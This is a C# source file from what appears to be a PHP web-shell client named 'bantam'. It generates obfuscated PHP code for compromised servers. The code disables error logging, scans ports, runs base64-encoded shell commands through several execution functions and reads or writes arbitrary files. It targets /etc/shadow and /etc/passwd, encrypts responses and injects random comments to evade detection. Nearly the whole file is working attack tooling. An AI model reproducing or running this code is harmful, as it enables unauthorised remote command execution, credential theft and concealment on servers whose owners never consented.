using bantam.Forms;
using System.Collections.Generic;
using System.Text;

namespace bantam.Classes
{
    static class PhpBuilder
    {
        /// <summary>
        /// 
        /// </summary>
        public const string responseDataSeperator = ",.$.,";

        /// <summary>
        /// 
        /// </summary>
        public const string responseDataRowSeperator = "|=$=|";

        /// <summary>
        /// PHP
        /// </summary>
        public const string phpServerScriptFileName = "$_SERVER['SCRIPT_FILENAME']";

        /// <summary>
        /// Linux File Locations
        /// </summary>
        public const string linuxFS_ShadowFile          = "/etc/shadow";
        public const string linuxFS_PasswdFile          = "/etc/passwd";
        public const string linuxFS_IssueFile           = "/etc/issue.net";
        public const string linuxFS_hostTargetsFile     = "/etc/hosts";
        public const string linuxFS_ProcVersion         = "/proc/version";
        public const string linuxFS_NetworkInterfaces   = "/etc/network/interfaces";

        /// <summary>
        /// Windows File Locations
        /// </summary>
        public const string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        /// <summary>
        /// OS Commands
        /// </summary>
        public const string linuxOS_PsAux           = "ps aux";
        public const string linuxOS_Ifconfig        = "ifconfig";
        public const string windowsOS_Ipconfig      = "ipconfig";
        public const string windowsOS_TaskList      = "tasklist";
        public const string windowsOS_NetUser       = "net user";
        public const string windowsOS_NetAccounts   = "net accounts";
        public const string windowsOS_Ver           = "ver";
        public const string posixOS_Whoami          = "whoami";

        public static readonly string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
        public static readonly string phpOb_End   = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();

        /// <summary>
        /// Generates a "randomly" named php variable for use/reference within code
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPVar(int maxNum = 16)
        {
            int maxLength = Config.PhpVariableNameMaxLength;
            int randomLength = Helper.RandomNumber(maxLength);
            return "$" + Helper.RandomString(1, true) + Helper.RandomString(randomLength, true, true);
        }

        /// <summary>
        /// Returns a random PHP comment string of a random length with a maxlength, 
        /// uses a slider in the options form to determine injection freqency based on slider value
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPComment()
        {
            if (!Config.InjectRandomComments) {
                return string.Empty;
            }

            int randomNumber = Helper.RandomNumber(100);
            int maxCommentLength = Config.CommentMaxLength;
            int commentFreqency = Config.CommentFrequency;

            if (randomNumber <= commentFreqency) {
                int randomLength = Helper.RandomNumber(maxCommentLength);
                return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
            }
            return string.Empty;
        }

        /// <summary>
        /// Returns PHP code that should help to disable error logging, 
        /// shuffles the code into a random order since it does not matter
        /// </summary>
        /// <returns></returns>
        public static string DisableErrorLogging()
        {
            StringBuilder linesRandomized = new StringBuilder();

            //order doesn't matter so shuffle these lines
            List<string> shuffleableLines = new List<string> {
                "@error_reporting(0);",
                "@ini_set('error_log', NULL);",
                "@ini_set('log_errors', 0);"
            };

            Helper.ShuffleList(shuffleableLines);

            foreach (var line in shuffleableLines) {
                linesRandomized.Append(RandomPHPComment());
                linesRandomized.Append(line);
            }

            return linesRandomized.ToString();
        }

        /// <summary>
        /// Overrides PHP max_execution_time setting, to prevent execution timeouts
        /// </summary>
        /// <returns></returns>
        public static string MaxExecutionTime()
        {
            return "@ini_set('max_execution_time', 0);" + RandomPHPComment();
        }

        /// <summary>
        /// OpenSSL AES-256-CBC encryption implementation
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <param name="mode"></param>
        /// <returns></returns>
        public static string OpenSSLEncryption(string varName, string encryptionKey, string encryptionIV, string mode = "AES-256-CBC")
        {
            return "echo base64_encode(@openssl_encrypt(" + varName + ", '" + mode + "', '" + encryptionKey + "', OPENSSL_RAW_DATA,'" + encryptionIV + "'));";
        }

        /// <summary>
        /// Mcrypt AES-256-CBC encryption implementation
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <returns></returns>
        public static string McryptEncryption(string varName, string encryptionKey, string encryptionIV)
        {
            string result;
            string padVar = RandomPHPVar();
            string blockBar = RandomPHPVar();

            result = blockBar + " = @mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                   + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                   + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                   + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
            return result;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="encryptionKey">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <param name="encryptionIV">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <returns></returns>
        public static string EncryptPhpVariableAndEcho(int ResponseEncryptionMode, ref string encryptionKey, ref string encryptionIV)
        {
            //todo make dynamic/random into config loaded once???
            string varName = "$result";
            encryptionIV = CryptoHelper.GetRandomEncryptionIV();
            encryptionKey = CryptoHelper.GetRandomEncryptionKey();

            string encryption = RandomPHPComment()
                              + varName + " = base64_encode(" + varName + ");"
                              + RandomPHPComment();

            if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
            } else if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
            } else {
                LogHelper.AddGlobalLog("Unknown encryption type selected.", "GUI Failure", LogHelper.LOG_LEVEL.ERROR);
                return string.Empty;
            }

            encryption += RandomPHPComment();

            return encryption;
        }

        /// <summary>
        /// This is the initial php code that is ran on every client on connection startup to gather a bit of information about them
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string InitShellData(bool encryptResponse)
        {
            string osVar = RandomPHPVar();
            string cwdVar = RandomPHPVar();
            string freespaceVar = RandomPHPVar();
            string totalfreespaceVar = RandomPHPVar();
            string releaseVar = RandomPHPVar();
            string kernelVar = RandomPHPVar();
            string serverIpVar = RandomPHPVar();
            string serverSoftwareVar = RandomPHPVar();
            string userVar = RandomPHPVar();
            string uidVar = RandomPHPVar();
            string gidVar = RandomPHPVar();
            string groupVar = RandomPHPVar();
            string phpVersionVar = RandomPHPVar();

            string responseCode = string.Empty;

            StringBuilder linesRandomized = new StringBuilder();
            StringBuilder userLines = new StringBuilder();

            //order doesn't matter so shuffle these lines
            List<string> shuffleableLines = new List<string> {
                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",

                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");"
                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" 
                       + totalfreespaceVar+ " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),

                kernelVar       + " = @php_uname('s');",
                phpVersionVar   + " = @phpversion();",
                releaseVar      + " = @php_uname('r');",
                serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
            };

            Helper.ShuffleList(shuffleableLines);

            foreach (var line in shuffleableLines) {
                linesRandomized.Append(line);
                linesRandomized.Append(RandomPHPComment());
            }

            if (encryptResponse) {
                responseCode = "$result = ";
            } else {
                responseCode = "echo ";
            }

            responseCode += osVar + ".'" + responseDataSeperator
                     + "'." + cwdVar + ".'" + responseDataSeperator
                     + "'." + freespaceVar + ".'" + responseDataSeperator
                     + "'." + totalfreespaceVar + ".'" + responseDataSeperator
                     + "'." + releaseVar + ".'" + responseDataSeperator
                     + "'." + kernelVar + ".'" + responseDataSeperator
                     + "'." + serverIpVar + ".'" + responseDataSeperator
                     + "'." + serverSoftwareVar + ".'" + responseDataSeperator
                     + "'." + userVar + ".'" + responseDataSeperator
                     + "'." + uidVar + ".'" + responseDataSeperator
                     + "'." + gidVar + ".'" + responseDataSeperator
                     + "'." + groupVar + ".'" + responseDataSeperator
                     + "'." + phpVersionVar + ";";

            List<string> userInfoLines = new List<string> {
                "if (!function_exists('posix_getegid')) {",
                    userVar + " = @get_current_user();",
                    uidVar + " = @getmyuid();",
                    gidVar + " = @getmygid();",
                    groupVar + " = '?';",
                "} else {",
                    uidVar + " = @posix_getpwuid(posix_geteuid());",
                    gidVar + " = @posix_getgrgid(posix_getegid());",
                    userVar + "= " + uidVar + "['name'];",
                    uidVar + " = " + uidVar + "['uid'];",
                    gidVar + " = " + gidVar + "['gid'];",
                    groupVar + " = " + gidVar + "['name'];",
                "}"
            };

            foreach(var line in userInfoLines) {
                userLines.Append(line);
                userLines.Append(RandomPHPComment());
            }

            return linesRandomized
                 + userLines.ToString()
                 + responseCode
                 + RandomPHPComment();
        }

        /// <summary>
        /// Puts port 1-1024 into php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortsScannerPorts1To1024()
        {
            return "$ports = range(1, 1024);";
        }

        /// <summary>
        /// Puts every possible TCP port into the php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsAll()
        {
            return "$ports = range(1, 65535);";
        }

        /// <summary>
        /// Puts an array of common ports into the php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsCommon()
        {
            return "$ports = array(20, 21, 22, 23, 25, 53, 80, 81, 88, 110, 123, 135, 137, 138, 143, 443, 445, 587, 2049, 2082, 2083, 2086, 2087, 2525, 3306, 6379, 6380, 8443, 8843, 8080, 8081, 8888, 11211);";
        }

        /// <summary>
        /// Scans the remote "host" for open ports
        /// </summary>
        /// <param name="host">The target to portscan</param>
        /// <returns></returns>
        public static string PortScanner(string host, string portsCode, bool encryptResponse)
        {
            string connectionVar = RandomPHPVar();
            string portVar = RandomPHPVar();
            string errVar = RandomPHPVar();
            string errNoVar = RandomPHPVar();
            string hasResVar = RandomPHPVar();

            if (encryptResponse) {
                return "$result='';"
                     + "@ini_set('max_execution_time', 0);"
                     + portsCode
                     + "foreach ($ports as " + portVar + ") {"
                        + connectionVar + " = @fsockopen('" + host + "', " + portVar  + ", " + errNoVar + ", "+ errVar + ", 2);"
                         + "if (is_resource(" + connectionVar  + ")) { "
                             + "$result .= " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). '" + responseDataRowSeperator + "';"
                             + "fclose(" + connectionVar + ");"
                        + "}}"
                     + "if (empty($result)) { $result = 'None'; }";
            } else {
                return hasResVar + "=0;"
                     + "@ini_set('max_execution_time', 0);"
                     + portsCode
                     + "foreach ($ports as " + portVar + ") {"
                        + connectionVar + " = @fsockopen('" + host + "', " + portVar + ", " + errNoVar + ", " + errVar + ", 2);"
                        + "if (is_resource(" + connectionVar  + ")) { "
                            + hasResVar + " = 1;"
                             + "echo " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). \"\n\";"
                             + "fclose(" + connectionVar + ");"
                        + "}}"
                     + "if (empty(" + hasResVar + ")) { echo 'None'; }";
            }
        }

        /// <summary>
        /// Gets the php code for creating a very basic CURL request
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static string getBasicCurl(string url, bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();
            string responseCode = string.Empty;
            string curlVar = RandomPHPVar();

            if (encryptResponse) {
                responseCode = "$result = ";
            }

            List<string> lines = new List<string> {
                curlVar + " = curl_init();",

                "curl_setopt_array(" + curlVar + ", array(" +
                    "CURLOPT_SSL_VERIFYPEER => false," +
                    "CURLOPT_FOLLOWLOCATION => true," +
                    "CURLOPT_USERAGENT => '" + Config.DefaultUserAgent  + "'," +
                    "CURLOPT_RETURNTRANSFER => 1," +
                    "CURLOPT_URL => '" + url + "'," +
                "));",

                 responseCode + "curl_exec(" + curlVar + ");",

                 "curl_close(" + curlVar + ");"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }

            return result.ToString();
        }

        /// <summary>
        /// Executes system code using the function selected in the Options form
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ExecuteSystemCode(string code, bool encryptResponse)
        {
            string result = string.Empty;

            string randomvarName = RandomPHPVar();
            string b64Code = Helper.EncodeBase64ToString(code);

            if (encryptResponse) {
                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                    result = phpOb_Start + "@system(base64_decode('" + b64Code + "'));" + phpOb_End;
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                    result = phpOb_Start + "@passthru(base64_decode('" + b64Code + "'));" + phpOb_End;
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                    result = "$result = shell_exec(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                           + "$result = @join(PHP_EOL, " + randomvarName + ");";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                    result = "$result = ''; if(is_resource("+ randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                           + "while (!@feof(" + randomvarName + ")) { $result .= fread(" + randomvarName + ", 1024); }"
                           + "pclose(" + randomvarName + ");"
                           + "}";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                    result = randomvarName + " = base64_decode('" + b64Code + "'); $result = `" + randomvarName + "`;";
                }
            } else {
                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                    result = "@system(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                    result = "@passthru(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                    result = "echo shell_exec(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                           + "echo @join(PHP_EOL, " + randomvarName + ");";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                    result = "if(is_resource(" + randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                           + "while (!@feof(" + randomvarName + ")) { echo fread(" + randomvarName + ", 1024); }"
                           + "pclose(" + randomvarName + ");"
                           + "}";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                    result = "echo `base64_decode('" + b64Code + "')`";
                }
            }
            return result;
        }

        /// <summary>
        /// phpinfo(); page
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string PhpInfo(bool encryptResponse)
        {
            if (encryptResponse) {
                return phpOb_Start
                      + "phpinfo();"
                      + phpOb_End;
            } else {
                return "phpinfo();";
            }
        }

        /// <summary>
        /// echo's 1 as a test
        /// </summary>
        /// <param name="encryptReponse"></param>
        /// <returns></returns>
        public static string PhpTestExecutionWithEcho1(bool encryptReponse)
        {
            if (encryptReponse) {
                return "$result = '1';";
            } else {
                return "echo '1';";
            }
        }

        /// <summary>
        /// Windows function for getting HDD letters for the filebrowser
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string GetHardDriveLettersPhp(bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();

            string driveVar = RandomPHPVar();
            string responseCode = string.Empty;

            if (encryptResponse) {
                responseCode = "$result .= ";
            } else {
                responseCode = "echo ";
            }

            List<string> lines = new List<string> {
                "$result=''; foreach (range('a', 'z') as " + driveVar + ") {",
                "if (is_dir(" + driveVar + @". ':\\')) {",
                responseCode + driveVar + ".':|';",
                "}}"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }
            return result.ToString();
        }

        /// <summary>
        /// Gets base64 encoded file contents from the specified "fileName" variable
        /// </summary>
        /// <param name="fileName">This expects a php variable that contains the path</param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
            } else {
                return "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
            }
        }

        /// <summary>
        /// Gets base64 encoded file contents from the specified "fileName" variable
        /// </summary>
        /// <param name="fileName">This expects the direct path string to the file</param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileToBase64(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
            } else {
                return "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
            }
        }

        /// <summary>
        /// Writes a file to the server at the specified "remoteFileLocation" location.
        /// </summary>
        /// <param name="remoteFileLocation">This expects the direct path string to the file you want to create</param>
        /// <param name="b64FileContents"></param>
        /// <returns></returns>
        public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
        {
            return "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");";
        }

        /// <summary>
        /// Writes a file to the server at the specified "remoteFileLocation" location.
        /// </summary>
        /// <param name="remoteFileLocation"></param>
        /// <param name="b64FileContents">This expects a php variable that contains the path</param>
        /// <returns></returns>
        public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
        {
            return "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");";
        }

        /// <summary>
        /// Returns the directory contents of a specified directory/path
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string DirectoryEnumerationCode(string location, string phpVersion, bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();

            string varItem = RandomPHPVar();
            string responseCode = string.Empty;
            string varException = RandomPHPVar();

            if (encryptResponse) {
                responseCode = "$result .= ";
            } else {
                responseCode = "echo ";
            }

            List<string> lines = new List<string> {
                "$result='';",
                 "try {",
                 "foreach (new DirectoryIterator('" + location + "') as " + varItem + ") {",

                 responseCode + varItem + "->getBasename().'" + responseDataSeperator + "'."
                        + varItem + "->getPath().'" + responseDataSeperator + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + responseDataSeperator + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + responseDataSeperator + "'."
                        + varItem + "->getPerms().'" + responseDataRowSeperator + "';",

                 "}}catch(Exception " + varException + "){ }"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }
            return result.ToString();
        }

        /// <summary>
        /// Returns the appropriate console command for getting running process
        /// </summary>
        /// <param name="windowsOS"></param>
        /// <returns></returns>
        public static string TaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }
    }
}
